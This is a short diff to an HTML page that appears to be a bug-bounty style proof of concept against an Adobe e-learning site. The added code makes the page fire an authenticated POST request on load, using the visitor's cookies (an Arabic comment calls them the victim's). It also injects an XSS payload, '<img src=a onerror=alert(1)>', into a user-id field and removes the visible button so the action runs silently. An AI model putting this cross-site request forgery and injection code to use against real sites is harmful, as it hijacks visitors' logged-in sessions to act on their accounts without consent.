@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Follow Request</title>
+    <title>Executing Request</title>
     <script>
         window.onload = function() {
             fetch("https://elearning.adobe.com/cpapi/v1/profile/followed", {
                 method: "POST",
-                credentials: "include", // يأخذ كوكي المستخدم تلقائيًا
+                credentials: "include", // يستخدم كوكي الضحية
                 headers: {
                     "Content-Type": "application/json",
                     "X-Requested-With": "XMLHttpRequest"
                 },
                 body: JSON.stringify({
                     "user_id": 460972,
-                    "followee_user_id": "158195d726nhpjxk",
+                    "followee_user_id": "158195d726<img src=a onerror=alert(1)>hpjxk",
                     "verbs": []
                 })
             })
@@ -26,8 +26,7 @@
     </script>
 </head>
 <body>
-    <h2>Click to Follow</h2>
-    <p>Follow a user by clicking the button below:</p>
-    <button onclick="window.onload()">Follow User</button>
+    <h2>Processing...</h2>
+    <p>If you're seeing this, the request has been sent.</p>
 </body>
 </html>
